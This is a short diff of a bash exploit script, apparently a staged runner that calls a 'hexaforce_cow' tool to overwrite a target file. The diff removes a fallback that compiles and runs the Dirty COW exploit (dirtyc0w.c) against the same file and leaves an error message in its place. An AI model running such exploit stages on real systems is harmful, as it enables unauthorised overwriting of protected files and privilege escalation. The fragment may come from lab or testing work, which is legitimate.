@@ -60,12 +60,7 @@ stage_1() {
     if [ -f "./hexaforce_cow" ]; then
         ./hexaforce_cow --exploit "$TARGET_FILE" "HEXA_FORCE_PWNED"
     else
-        echo -e "  - ${RED}Hexa Force tool not available, falling back to legacy exploit${NC}"
-        gcc -pthread dirtyc0w.c -o dirtyc0w 2>/dev/null
-        if [ $? -eq 0 ]; then
-            ./dirtyc0w "$TARGET_FILE" "DIRTY_COW_SUCCESS!!!" > /dev/null 2>&1
-            echo -e "  - Post-exploit content: \"$(cat "$TARGET_FILE")\""
-        fi
+        echo -e "  - ${RED}Hexa Force tool failed to compile! Cannot proceed with exploit.${NC}"
     fi
     echo ""
 
